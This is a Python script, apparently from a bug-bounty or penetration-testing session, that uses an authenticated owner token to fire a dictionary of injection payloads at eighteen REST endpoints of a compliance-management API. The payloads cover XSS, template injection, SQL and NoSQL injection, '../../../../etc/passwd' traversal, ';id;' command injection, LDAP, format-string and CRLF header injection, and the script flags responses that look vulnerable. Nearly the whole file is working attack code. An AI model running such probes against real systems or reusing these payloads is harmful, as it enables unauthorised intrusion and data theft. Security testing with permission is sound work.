import json,subprocess,os,re,itertools,time
from concurrent.futures import ThreadPoolExecutor
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()

# payload matrix - each targets a distinct bug class
PAYLOADS = {
 'xss'   : '"><svg onload=alert(1)>ZX',
 'ssti'  : '{{7*7}}ZX',
 'sqli'  : "'||(SELECT 1)||'ZX",
 'sqlerr': "ZX'--",
 'nosql' : '{"$ne":null}ZX',
 'path'  : '../../../../etc/passwd',
 'cmd'   : ';id;ZX',
 'null'  : 'ZX%00',
 'unicode':'ZX%E2%80%AE',
 'ldap'  : '*)(uid=*))(|(uid=*ZX',
 'format': 'ZX%s%s%s%n',
 'crlf'  : 'ZX%0d%0aInjected-Header:1',
}

def call(method, path, body=None, ct='application/json', timeout=12):
    cmd=['curl','-s','-m',str(timeout),'-o','/tmp/hb','-w','%{http_code}|%{time_total}',
         '-X',method,H+path,'-H','token: '+TOK,'-H',BB,'-H','Content-Type: '+ct]
    if body is not None:
        if ct=='application/json': cmd+=['-d',json.dumps(body)]
        else: cmd+=['-d',body]
    r=subprocess.run(cmd,capture_output=True,text=True)
    out=r.stdout.strip()
    try: code,t=out.split('|')
    except: code,t=out,'0'
    try: txt=open('/tmp/hb',encoding='utf-8',errors='replace').read()
    except: txt=''
    return code,float(t or 0),txt

# baseline: each endpoint with benign value
def probe(method, path_tpl, param_name, location, base_body=None):
    """location: path|query|body"""
    results={}
    # baseline
    benign='ZXbenign123'
    if location=='path':
        p=path_tpl.replace('{id}',benign); b=None
    elif location=='query':
        p=f"{path_tpl}?{param_name}={benign}"; b=None
    else:
        p=path_tpl; b={**(base_body or {}), param_name:benign}
    bc,bt,bx=call(method,p,b)
    results['_baseline']=(bc,round(bt,2),len(bx))
    for name,pay in PAYLOADS.items():
        if location=='path':
            p=path_tpl.replace('{id}',pay); b=None
        elif location=='query':
            p=f"{path_tpl}?{param_name}={pay}"; b=None
        else:
            p=path_tpl; b={**(base_body or {}), param_name:pay}
        c,t,x=call(method,p,b)
        reflected = ('ZX' in x and ('<svg' in x or '{{7*7}}' in x or 'etc/passwd' in x or 'Injected-Header' in x))
        anomaly=[]
        if c!=bc: anomaly.append(f'{bc}->{c}')
        if t>bt*3 and t>3: anomaly.append(f'time {bt}->{round(t,2)}')
        if reflected: anomaly.append('REFLECTED')
        if '49' in x and name=='ssti' and '{{7*7}}' not in x: anomaly.append('SSTI-49?')
        if anomaly: results[name]=(c,round(t,2),anomaly)
    return results

# endpoints with injectable params (from surface map)
TARGETS=[
 # (method, path, param, location, base_body)
 ('GET','/api/v1/users/{id}',None,'path',None),
 ('GET','/api/v1/issues/{id}',None,'path',None),
 ('GET','/api/v1/controls/{id}',None,'path',None),
 ('GET','/api/v1/risks/{id}',None,'path',None),
 ('GET','/api/v1/narratives/{id}',None,'path',None),
 ('GET','/api/v1/files/{id}',None,'path',None),
 ('GET','/api/v1/attachments/{id}',None,'path',None),
 ('GET','/api/v1/teams/{id}',None,'path',None),
 ('GET','/api/v1/roles/{id}',None,'path',None),
 ('GET','/api/v1/processes/{id}',None,'path',None),
 ('GET','/api/v1/document_versions/{id}',None,'path',None),
 ('GET','/api/v1/frameworks/{id}',None,'path',None),
 ('GET','/api/v1/policies/{id}',None,'path',None),
 ('GET','/api/v1/tests/{id}',None,'path',None),
 ('GET','/api/v1/auditable_entities/{id}',None,'path',None),
 ('GET','/api/v1/esg_metrics/{id}',None,'path',None),
 ('GET','/api/v1/vendors/{id}',None,'path',None),
 ('GET','/api/v1/exception_requests/{id}',None,'path',None),
]
print(f"{'endpoint':44} {'anomalies'}")
for m,p,param,loc,bb in TARGETS:
    r=probe(m,p,param,loc,bb)
    anom={k:v for k,v in r.items() if k!='_baseline'}
    if anom:
        print(f"{m+' '+p:44} {json.dumps(anom)[:200]}")
    else:
        print(f"{m+' '+p:44} baseline={r['_baseline']} clean")
